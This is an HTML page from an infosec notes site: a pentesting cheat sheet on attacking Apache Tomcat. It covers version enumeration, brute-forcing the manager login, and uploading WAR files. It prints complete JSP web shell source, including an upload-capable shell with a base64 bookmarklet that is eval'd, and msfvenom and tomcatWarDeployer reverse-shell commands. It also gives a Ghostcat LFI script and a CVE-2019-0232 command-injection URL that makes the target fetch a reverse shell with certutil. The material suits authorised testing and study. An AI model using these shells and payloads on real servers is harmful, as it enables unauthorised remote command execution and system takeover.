<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <title>ovelny - chaos/web-exploitation/tomcat</title>
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <meta
      name="description"
      content="ovelny - notes on infosec, penetration testing, programming and others"
    />
    <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
    <link rel="stylesheet" type=text/css href="/assets/css/dead-simple.min.css">
    <link rel="stylesheet" type=text/css href="/assets/css/rouge.min.css">
    <link
      href="/atom.xml"
      rel="alternate"
      title="ovelny"
      type="application/atom+xml"
    />
    <script src="/assets/js/scramble-text.min.js" defer></script>
    <script src="/assets/js/zoom-images.min.js" defer></script>
    <meta name="twitter:card" content="summary"/>
    <meta name="twitter:site" content="@ovelny"/>
    <meta name="twitter:title" content="ovelny - chaos/web-exploitation/tomcat"/>
    <meta name="twitter:image" content="https://ovelny.sh/assets/images/ovelny-logo.png"/>
    <meta name="twitter:image:alt" content="ovelny logo: 6 white circles grouped together forming a triangle shape, with a black background."/>
  </head>
  <body>

    <header>
      <section>
        <a href="/">
          <img
            class="logo"
            src="/assets/images/ovelny-pfp.png"
            alt="ovelny profile picture: a glitched picture of a three-eyed girl, staring intensely at the viewer."
          />
        </a>
        <h2><a class="ovelny" href="/">ovelny</a></h2>
      </section>
      <nav>
        <a href="/now/">now</a>
        <a href="/chaos/">chaos</a>
        <a href="/phasm/">phasm</a>
        <a href="/support/">support</a>
        <a href="/atom.xml" target="_blank" rel="noopener noreferrer">rss</a>
        <a href="/about/">about</a>
      </nav>
    </header>
    <main>

    
    <h1>tomcat</h1>

<p>open-source web server that hosts applications in java. runs java servlets and java server pages (JSP) scripts. usually less exposed on the internet, but very valuable in internal pentests as it often runs as a high-privileged user.</p>

<h2>discovery - enumeration</h2>

<p>browsing an invalid page will usually reveal tomcat&#39;s version. if custom error pages are used, the <code>/docs</code> endpoint might also reveal the version with <code>curl -s http://&lt;URL&gt;/docs/ | grep Tomcat</code>.</p>

<p>common structure of a tomcat install:</p>

<div class="highlight"><pre class="highlight plaintext"><code>├── bin # stores scripts and binaries to start/run tomcat server.
├── conf # configuration files used by tomcat.
│   ├── catalina.policy
│   ├── catalina.properties
│   ├── context.xml
│   ├── tomcat-users.xml # stores user credentials and assigned roles.
│   ├── tomcat-users.xsd
│   └── web.xml
├── lib # stores JAR files needed for tomcat.
├── logs # stores log files.
├── temp # stores log files.
├── webapps # default webroot of tomcat, hosts all applications.
│   ├── manager
│   │   ├── images
│   │   ├── META-INF
│   │   └── WEB-INF
|   |       └── web.xml
│   └── ROOT
│       └── WEB-INF
└── work # caches data, stores it during runtime.
    └── Catalina
        └── localhost
</code></pre></div>

<p>directories inside <code>webapps</code> are expected to have the following structure:</p>

<div class="highlight"><pre class="highlight plaintext"><code>webapps/myapp
├── images
├── index.jsp
├── META-INF
│   └── context.xml
├── status.xsd
└── WEB-INF
    ├── jsp # stores server pages, comparable to PHP files in CMSs.
    |   └── admin.jsp
    └── web.xml # stores information about routes and classes handling them.
    └── lib # stores libraries needed by the app.
    |    └── jdbc_drivers.jar
    └── classes # stores compiled classes, can contain sensitive information.
        └── AdminServlet.class   
</code></pre></div>

<p>to test for weak credentials, we want to try to access the <code>/manager</code> and <code>/host-manager</code> pages. directly browse to them or use gobuster to find them, like <code>gobuster dir -u &lt;URL&gt; -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt</code>.</p>

<h2>attack paths</h2>

<h3>login bruteforcing</h3>

<p>we can bruteforce the tomcat manager page either on <code>/manager</code> or <code>/host-manager</code>. with metasploit, you can <code>use scanner/http/tomcat_mgr_login</code>. don&#39;t forget to set up a proxy with <code>set PROXIES HTTP:127.0.0.1:8080</code> if you need to see what&#39;s happening behind the scenes.</p>

<p>without it, <a href="https://github.com/b33lz3bub-1/Tomcat-Manager-Bruteforce" rel="nofollow">this script</a> works as well:</p>

<div class="highlight"><pre class="highlight shell"><code>mgr_brute <span class="nt">-u</span> &lt;usernames file&gt; <span class="nt">-p</span> &lt;wordlist&gt; <span class="nt">-U</span> &lt;URL&gt; <span class="nt">-P</span> &lt;/host-manager/ or /manager/&gt;
</code></pre></div>

<p><code>tomcat_mgr_default_users.txt</code> and <code>tomcat_mgr_default_pass.txt</code> are reliable lists in that scenario. use them!</p>

<h3>WAR file upload</h3>

<p>if we&#39;re able to log in, a GUI interface is available to manage the application at <code>/manager/html</code>, provided our user has the <code>manager-gui</code> role to access it. we can upload a WAR file (Web Application Archive) there, containing a payload to compromise the app:</p>

<div class="highlight"><pre class="highlight java"><code><span class="o">&lt;%</span><span class="err">@</span> <span class="n">page</span> <span class="kn">import</span><span class="err">="</span><span class="nn">java.util.*</span><span class="o">,</span><span class="n">java</span><span class="o">.</span><span class="na">io</span><span class="o">.*</span><span class="s">"%&gt;
&lt;%
//
// JSP_KIT
//
// cmd.jsp = Command Execution (unix)
//
// by: Unknown
// modified: 27/06/2003
//
%&gt;
&lt;HTML&gt;&lt;BODY&gt;
&lt;FORM METHOD="</span><span class="no">GET</span><span class="s">" NAME="</span><span class="n">myform</span><span class="s">" ACTION=""&gt;
&lt;INPUT TYPE="</span><span class="n">text</span><span class="s">" NAME="</span><span class="n">cmd</span><span class="s">"&gt;
&lt;INPUT TYPE="</span><span class="n">submit</span><span class="s">" VALUE="</span><span class="nc">Send</span><span class="s">"&gt;
&lt;/FORM&gt;
&lt;pre&gt;
&lt;%
if (request.getParameter("</span><span class="n">cmd</span><span class="s">") != null) {
        out.println("</span><span class="nl">Command:</span> <span class="s">" + request.getParameter("</span><span class="n">cmd</span><span class="s">") + "</span><span class="o">&lt;</span><span class="no">BR</span><span class="o">&gt;</span><span class="s">");
        Process p = Runtime.getRuntime().exec(request.getParameter("</span><span class="n">cmd</span><span class="err">"</span><span class="o">));</span>
        <span class="nc">OutputStream</span> <span class="n">os</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="na">getOutputStream</span><span class="o">();</span>
        <span class="nc">InputStream</span> <span class="n">in</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="na">getInputStream</span><span class="o">();</span>
        <span class="nc">DataInputStream</span> <span class="n">dis</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">DataInputStream</span><span class="o">(</span><span class="n">in</span><span class="o">);</span>
        <span class="nc">String</span> <span class="n">disr</span> <span class="o">=</span> <span class="n">dis</span><span class="o">.</span><span class="na">readLine</span><span class="o">();</span>
        <span class="k">while</span> <span class="o">(</span> <span class="n">disr</span> <span class="o">!=</span> <span class="kc">null</span> <span class="o">)</span> <span class="o">{</span>
                <span class="n">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">disr</span><span class="o">);</span> 
                <span class="n">disr</span> <span class="o">=</span> <span class="n">dis</span><span class="o">.</span><span class="na">readLine</span><span class="o">();</span> 
                <span class="o">}</span>
        <span class="o">}</span>
<span class="o">%&gt;</span>
<span class="o">&lt;/</span><span class="n">pre</span><span class="o">&gt;</span>
<span class="o">&lt;/</span><span class="no">BODY</span><span class="o">&gt;&lt;/</span><span class="no">HTML</span><span class="o">&gt;</span>
</code></pre></div>

<p>this <code>cmd.jsp</code> web shell payload needs to be packaged into a <code>.war</code> file with the zip command:</p>

<div class="highlight"><pre class="highlight shell"><code>zip <span class="nt">-r</span> hacky.war cmd.jsp
</code></pre></div>

<p>alternatively, you can also create a malicious WAR file with msfvenom:</p>

<div class="highlight"><pre class="highlight shell"><code>msfvenom <span class="nt">-p</span> java/jsp_shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>&lt;attack box IP&gt; <span class="nv">LPORT</span><span class="o">=</span>&lt;attack box port&gt; <span class="nt">-f</span> war <span class="o">&gt;</span> hacky.war
</code></pre></div>

<p>back in <code>/manager/html</code>, click <code>browse</code> to select our .war payload and click <code>deploy</code>. this will add the <code>/hacky</code> app to the applications table, since we named our <code>.war</code> similarly. just clicking on it won&#39;t work, as we need to access the <code>/hacky/cmd.jsp</code> endpoint to use our uploaded web shell.</p>

<p>we also can use curl with the <code>cmd</code> GET parameter:</p>

<div class="highlight"><pre class="highlight shell"><code>curl <span class="nt">-s</span> http://&lt;URL&gt;/hacky/cmd.jsp?cmd<span class="o">=</span><span class="nb">id</span>
</code></pre></div>

<p>this <a href="https://github.com/SecurityRiskAdvisors/cmd.jsp" rel="nofollow">JSP web shell</a> is particularly interesting too: it&#39;s under 1kb and only provides the web shell functionality through a javascript bookmarklet. here&#39;s how to use it:</p>

<div class="highlight"><pre class="highlight shell"><code><span class="c"># create the cmd.jsp file:</span>
<span class="nb">echo</span> <span class="s1">'&lt;%@page import="java.io.*, java.util.*, javax.xml.bind.*, java.net.*"%&gt;&lt;script&gt;eval(window.localStorage.embed)&lt;/script&gt;&lt;%!public String v(String w){String x="";try{x=URLDecoder.decode(w,"UTF-8");}catch(Exception e){}return x;}%&gt;&lt;%String o,l,d;o=l=d="";DataInputStream r=new DataInputStream(request.getInputStream());while((l=r.readLine())!=null){d+=l;}if(d.indexOf("c=")&gt;=0){String g=v(d.substring(2));String s;try{Process p=Runtime.getRuntime().exec(g);DataInputStream i=new DataInputStream(p.getInputStream());out.print("&lt;pre&gt;");while((s=i.readLine())!=null){o+=s.replace("&lt;","&amp;lt;").replace("&gt;","&amp;gt;")+"&lt;br&gt;";}}catch(Exception e){out.print(e);}}else{if(d.length()&gt;1){int b=d.indexOf("b=");int n=d.indexOf("n=");byte[] m=DatatypeConverter.parseBase64Binary(v(d.substring(b+2)));String f=v(d.substring(2,n-1))+File.separator+v(d.substring(n+2,b-1));try{OutputStream stream=new FileOutputStream(f);stream.write(m);o="Uploaded: "+f;}catch(Exception e){out.print(e);}}}%&gt;&lt;%=o%&gt;'</span> <span class="o">&gt;</span> cmd.jsp
</code></pre></div>

<p>upload the file as described above. then, add the following javascript code as a link in your bookmarks bar:</p>

<div class="highlight"><pre class="highlight javascript"><code><span class="nx">javascript</span><span class="p">:{</span><span class="nb">window</span><span class="p">.</span><span class="nx">localStorage</span><span class="p">.</span><span class="nx">embed</span><span class="o">=</span><span class="nb">window</span><span class="p">.</span><span class="nf">atob</span><span class="p">(</span><span class="dl">"</span><span class="s2">ZG9jdW1lbnQud3JpdGUoIjxwPiIpOw0KdmFyIGh0bWwgPSAiPGZvcm0gbWV0aG9kPXBvc3QgYWN0aW9uPSdjbWQuanNwJz5cDQo8aW5wdXQgbmFtZT0nYycgdHlwZT10ZXh0PjxpbnB1dCB0eXBlPXN1Ym1pdCB2YWx1ZT0nUnVuJz5cDQo8L2Zvcm0+PGhyPlwNCjxmb3JtIGFjdGlvbj0nY21kLmpzcCcgbWV0aG9kPXBvc3Q+XA0KVXBsb2FkIGRpcjogPGlucHV0IG5hbWU9J2EnIHR5cGU9dGV4dCB2YWx1ZT0nLic+PGJyPlwNClNlbGVjdCBhIGZpbGUgdG8gdXBsb2FkOiA8aW5wdXQgbmFtZT0nbicgdHlwZT0nZmlsZScgaWQ9J2YnPlwNCjxpbnB1dCB0eXBlPSdoaWRkZW4nIG5hbWU9J2InIGlkPSdiJz5cDQo8aW5wdXQgdHlwZT0nc3VibWl0JyB2YWx1ZT0nVXBsb2FkJz5cDQo8L2Zvcm0+PGhyPiI7DQp2YXIgZGl2ID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnZGl2Jyk7DQpkaXYuaW5uZXJIVE1MID0gaHRtbDsNCmRvY3VtZW50LmJvZHkuaW5zZXJ0QmVmb3JlKGRpdiwgZG9jdW1lbnQuYm9keS5maXJzdENoaWxkKTsNCg0KdmFyIGhhbmRsZUZpbGVTZWxlY3QgPSBmdW5jdGlvbihldnQpIHsNCiAgICB2YXIgZmlsZXMgPSBldnQudGFyZ2V0LmZpbGVzOw0KICAgIHZhciBmaWxlID0gZmlsZXNbMF07DQoNCiAgICBpZiAoZmlsZXMgJiYgZmlsZSkgew0KICAgICAgICB2YXIgcmVhZGVyID0gbmV3IEZpbGVSZWFkZXIoKTsNCg0KICAgICAgICByZWFkZXIub25sb2FkID0gZnVuY3Rpb24ocmVhZGVyRXZ0KSB7DQogICAgICAgICAgICB2YXIgYmluYXJ5U3RyaW5nID0gcmVhZGVyRXZ0LnRhcmdldC5yZXN1bHQ7DQogICAgICAgICAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnYicpLnZhbHVlID0gYnRvYShiaW5hcnlTdHJpbmcpOw0KICAgICAgICB9Ow0KDQogICAgICAgIHJlYWRlci5yZWFkQXNCaW5hcnlTdHJpbmcoZmlsZSk7DQogICAgfQ0KfTsNCmlmICh3aW5kb3cuRmlsZSAmJiB3aW5kb3cuRmlsZVJlYWRlciAmJiB3aW5kb3cuRmlsZUxpc3QgJiYgd2luZG93LkJsb2IpIHsNCiAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnZicpLmFkZEV2ZW50TGlzdGVuZXIoJ2NoYW5nZScsIGhhbmRsZUZpbGVTZWxlY3QsIGZhbHNlKTsNCn0gZWxzZSB7DQogICAgYWxlcnQoJ1RoZSBGaWxlIEFQSXMgYXJlIG5vdCBmdWxseSBzdXBwb3J0ZWQgaW4gdGhpcyBicm93c2VyLicpOw0KfQ==</span><span class="dl">"</span><span class="p">);</span><span class="nf">eval</span><span class="p">(</span><span class="nb">window</span><span class="p">.</span><span class="nx">localStorage</span><span class="p">.</span><span class="nx">embed</span><span class="p">);};</span><span class="k">void</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</code></pre></div>

<p>click the bookmark when you are on the cmd.jsp page. all done!</p>

<p>to clean up after ourselves:</p>

<ul>
<li>go back to <code>/manager/html</code></li>
<li>note down the file and upload location: 

<ul>
<li>path is usually similar to <code>/opt/tomcat/apache-tomcat-&lt;version number&gt;/webapps</code></li>
<li>run <code>ls</code> and <code>pwd</code> from our web shell to make sure of it</li>
</ul></li>
<li>click the <code>undeploy</code> button next to our uploaded application</li>
</ul>

<p>Another fully automated option is to use <a href="https://github.com/mgeeky/tomcatWarDeployer" rel="nofollow">tomcatWarDeployer</a>, with the following command:</p>

<div class="highlight"><pre class="highlight shell"><code><span class="c"># This will spawn a reverse shell with our own listener,</span>
<span class="c"># ncat or anything else, by giving us 5 seconds to run</span>
<span class="c"># it after the war payload is uploaded.</span>
tomcat_war_deployer <span class="nt">-U</span> &lt;user&gt; <span class="nt">-P</span> <span class="s1">'&lt;pass&gt;'</span> <span class="nt">-H</span> &lt;attack box IP&gt; <span class="nt">-p</span> &lt;attack box port&gt; &lt;target IP&gt;:&lt;target port&gt;/manager/html/ <span class="nt">-x</span> <span class="nt">-C</span>
</code></pre></div>

<h3>exploiting known vulnerabilities</h3>

<p>there are known CVEs we can exploit against tomcat: one of them is ghostcat, <code>CVE-2020-1938</code>. it works for tomcat versions before 9.0.31, 8.5.51 and 7.0.100. in these versions, the AJP (Apacha Jserv Protocol), which proxies requests, is misconfigured.</p>

<p>the service usually runs at port 8009, so we can try a targeted nmap scan:</p>

<div class="highlight"><pre class="highlight shell"><code>nmap <span class="nt">-sV</span> <span class="nt">-p</span> 8009,8080 &lt;domain name or IP&gt;
</code></pre></div>

<p>if the service is found along with tomcat, we can use <a href="https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi" rel="nofollow">this script</a> like the following:</p>

<div class="highlight"><pre class="highlight shell"><code><span class="c"># keep in mind this script can only perform </span>
<span class="c"># LFI in the target's web apps directory:</span>
tomcat-ajp-lfi &lt;domain name&gt; <span class="nt">-p</span> &lt;port&gt; <span class="nt">-f</span> &lt;WEB-INF/web.xml or another file <span class="k">in </span>web apps directory&gt;
</code></pre></div>

<p>Another CVE is <code>CVE-2019-0232</code>, affecting instance of tomcat runnning with <code>enableCmdLineArguments</code>, among with other non-default settings. It leverages CGI scripts, so if we find some as described on the related <a href="https://ovelny.sh/chaos/web-exploitation/CGIs/" rel="nofollow">chaos page</a>, this is worth a try.</p>

<p>The exploit is also described in details in this <a href="https://github.com/jaiguptanick/CVE-2019-0232" rel="nofollow">GitHub repo</a>.</p>

<p>If we find a <code>cgi</code> directory, say <code>/cgi</code>, enumerate possible scripts with ffuf:</p>

<div class="highlight"><pre class="highlight shell"><code>ffuf <span class="nt">-w</span> /usr/share/dirb/wordlists/common.txt <span class="nt">-u</span> http://&lt;target URL&gt;/cgi/&lt;FUZZ.cmd or FUZZ.bat&gt;
</code></pre></div>

<p>If we found one, we can use the following payload to trigger a download from our attack box:</p>

<div class="highlight"><pre class="highlight shell"><code>http://&lt;target IP&gt;:&lt;target port&gt;/cgi/&lt;CGI script <span class="k">in</span> .bat or .cmd&gt;?&amp;&amp;C%3a%5cWindows%5cSystem32%5ccertutil+-urlcache+-split+-f+http%3A%2F%2F&lt;attack box IP&gt;:&lt;attack box port&gt;%2F&lt;reverse shell file to upload&gt;
</code></pre></div>

<p>It might need some tweakings depending of the CGI script and/or tomcat&#39;s configuration. In one instance, we&#39;ve had to chain another command before our payload, as follows:</p>

<div class="highlight"><pre class="highlight shell"><code>http://&lt;target IP&gt;:&lt;target port&gt;/cgi/&lt;CGI script <span class="k">in</span> .bat or .cmd&gt;?&amp;dir&amp;&amp;C%3a%5cWindows%5cSystem32%5ccertutil+-urlcache+-split+-f+http%3A%2F%2F&lt;attack box IP&gt;:&lt;attack box port&gt;%2F&lt;reverse shell file to upload&gt;
</code></pre></div>

<h2>References</h2>

<ul>
<li><a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/tomcat" rel="nofollow">https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/tomcat</a></li>
</ul>

    
    </main>
    <footer id="footer">
      <div class="footer-section"><a href="/license/">CC BY-NC-SA 4.0</a><p>&nbsp;::&nbsp;2019 - 2025 ovelny</p></div>
      <div class="footer-section">「七転び八起き」</div>
    </footer>
  </body>
</html>

